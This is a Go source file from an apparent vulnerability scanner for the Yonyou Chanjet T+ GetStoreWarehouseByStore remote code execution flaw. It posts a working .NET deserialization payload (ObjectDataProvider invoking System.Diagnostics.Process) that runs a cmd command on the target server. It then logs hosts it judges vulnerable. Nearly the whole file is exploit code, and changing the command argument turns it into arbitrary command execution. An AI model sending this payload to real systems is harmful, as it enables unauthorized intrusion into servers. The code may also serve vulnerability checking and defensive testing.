package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func GetStoreWarehouseByStoreScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	GetStoreWarehouseByStore := "用友 畅捷通Tplus GetStoreWarehouseByStore 远程代码执行漏洞"
	urls := address + "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
	client.Timeout = 5 * time.Second
	response, _ := client.Post(urls, "text/plain", strings.NewReader("{\n \"storeID\":{\n  \"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n  \"MethodName\":\"Start\",\n  \"ObjectInstance\":{\n   \"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n   \"StartInfo\":{\n    \"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n    \"FileName\":\"cmd\",\n    \"Arguments\":\"/c ping www.baidu.com\"\n   }\n  }\n }\n}"))
	defer response.Body.Close()

	// 读取响应内容
	body, _ := ioutil.ReadAll(response.Body)

	if strings.Contains(string(body), "archivesId") || strings.Contains(string(body), "actorId") || strings.Contains(string(body), "System.Arg") {
		result := GetStoreWarehouseByStore + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename)
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, GetStoreWarehouseByStore, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, GetStoreWarehouseByStore)
		fmt.Println(output)
	}
}
